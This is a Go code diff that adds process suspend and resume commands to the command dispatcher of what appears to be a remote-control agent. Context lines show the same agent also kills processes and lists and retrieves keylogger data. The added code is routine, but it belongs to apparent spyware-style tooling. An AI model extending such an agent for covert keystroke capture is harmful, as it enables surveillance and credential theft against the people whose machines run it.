@@ -2141,6 +2141,62 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			pid = int32(p)
 		}
 		return HandleProcessKill(ctx, env, cmdID, pid)
+	case "process_suspend":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		if payload == nil {
+			if rawPayload, ok := envelope["payload"].(map[interface{}]interface{}); ok {
+				payload = make(map[string]interface{}, len(rawPayload))
+				for k, v := range rawPayload {
+					ks, ok := k.(string)
+					if !ok {
+						continue
+					}
+					payload[ks] = v
+				}
+			}
+		}
+		suspendPid := int32(0)
+		if p, ok := payload["pid"].(float64); ok {
+			suspendPid = int32(p)
+		}
+		if p, ok := payload["pid"].(uint64); ok {
+			suspendPid = int32(p)
+		}
+		if p, ok := payload["pid"].(int64); ok {
+			suspendPid = int32(p)
+		}
+		if p, ok := payload["pid"].(int); ok {
+			suspendPid = int32(p)
+		}
+		return HandleProcessSuspend(ctx, env, cmdID, suspendPid)
+	case "process_resume":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		if payload == nil {
+			if rawPayload, ok := envelope["payload"].(map[interface{}]interface{}); ok {
+				payload = make(map[string]interface{}, len(rawPayload))
+				for k, v := range rawPayload {
+					ks, ok := k.(string)
+					if !ok {
+						continue
+					}
+					payload[ks] = v
+				}
+			}
+		}
+		resumePid := int32(0)
+		if p, ok := payload["pid"].(float64); ok {
+			resumePid = int32(p)
+		}
+		if p, ok := payload["pid"].(uint64); ok {
+			resumePid = int32(p)
+		}
+		if p, ok := payload["pid"].(int64); ok {
+			resumePid = int32(p)
+		}
+		if p, ok := payload["pid"].(int); ok {
+			resumePid = int32(p)
+		}
+		return HandleProcessResume(ctx, env, cmdID, resumePid)
 	case "keylog_list":
 		return HandleKeylogList(ctx, env, cmdID)
 	case "keylog_retrieve":
